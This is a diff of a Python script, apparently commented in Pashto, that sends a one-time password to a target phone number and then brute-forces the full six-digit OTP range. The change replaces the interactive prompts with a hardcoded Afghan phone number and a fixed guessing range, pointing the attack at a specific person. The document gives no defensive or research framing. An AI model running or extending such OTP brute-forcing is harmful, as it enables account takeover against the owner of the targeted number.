@@ -119,13 +119,10 @@ print(f'  🔄 502 شوي OTPs بیا ازمویل کېږي')
 print('='*70)
 
 # ============================================
-# ۱. هدف شمېره
+# ۱. هدف شمېره (مستقیم)
 # ============================================
-while True:
-    MSISDN = input('\n🎯 هدف شمېره: ').strip()
-    if MSISDN.startswith('93') and len(MSISDN) == 11:
-        break
-    print('  ❌ ناسمه!')
+MSISDN = '93711834098'
+print(f'\n🎯 هدف شمېره: {MSISDN}')
 
 # ============================================
 # ۲. OTP همدا اوس لیږل کېږي
@@ -156,32 +153,10 @@ def send_otp_now():
 otp_result = send_otp_now()
 
 # ============================================
-# ۳. حدود
+# ۳. حدود (مستقیم)
 # ============================================
-print(f'\n{"="*70}')
-print(f'  🎯 د OTP حدود وټاکئ')
-print(f'{"="*70}')
-
-while True:
-    s = input('  پیل OTP (Enter=0): ').strip()
-    if s == '':
-        START = 0
-        break
-    if s.isdigit() and len(s) <= 6:
-        START = int(s)
-        break
-    print('  ❌ ناسم!')
-
-while True:
-    e = input('  پای OTP (Enter=999999): ').strip()
-    if e == '':
-        END = 999999
-        break
-    if e.isdigit() and len(e) <= 6 and int(e) >= START:
-        END = int(e)
-        break
-    print(f'  ❌ ناسم!')
-
+START = 100000
+END = 999999
 TOTAL = END - START + 1
 print(f'\n  📊 محدوده: {START:06d} → {END:06d} ({TOTAL:,} OTPs)')
 print(f'  ⚡ سرعت: اتومات (طلایي نسبت)')
